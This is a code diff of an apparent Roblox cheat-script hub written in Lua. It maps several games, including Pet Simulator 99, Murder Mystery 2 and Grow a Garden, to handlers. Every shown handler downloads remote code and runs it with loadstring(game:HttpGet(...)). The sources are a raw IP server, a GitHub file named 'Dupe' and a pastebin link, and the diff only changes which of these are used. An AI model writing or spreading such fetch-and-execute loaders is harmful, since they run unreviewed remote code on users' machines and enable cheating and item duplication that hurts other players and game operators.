@@ -228,7 +228,7 @@ local handlers = {
         name = "Pet Simulator 99",
         action = function()
             -- user-provided GitHub raw (wrapped with true)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/AMIRI-HPV/esan/refs/heads/main/hee2", true))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/AMIRI-HPV/XENON-HUB-V2-/refs/heads/main/Dupe", true))()
         end
     },
 
@@ -236,8 +236,7 @@ local handlers = {
     [18901165922] = {
         name = "PETS GO",
         action = function()
-            ID="b4f0a009-d8b0-4eed-a249-662f4ea817b9";
-            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+            loadstring(game:HttpGet("https://pastebin.com/raw/MmYs8cDf"))()
         end
     },
 
@@ -245,8 +244,7 @@ local handlers = {
     [142823291] = {
         name = "Murder Mystery 2",
         action = function()
-            ID="b4f0a009-d8b0-4eed-a249-662f4ea817b9";
-            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+            loadstring(game:HttpGet("https://pastebin.com/raw/MmYs8cDf"))()
         end
     },
 
@@ -263,8 +261,7 @@ local handlers = {
     [126884695634066] = {
         name = "Grow a Garden",
         action = function()
-            ID="b4f0a009-d8b0-4eed-a249-662f4ea817b9";
-            loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+            loadstring(game:HttpGet("https://pastebin.com/raw/MmYs8cDf"))()
         end
     },
 }
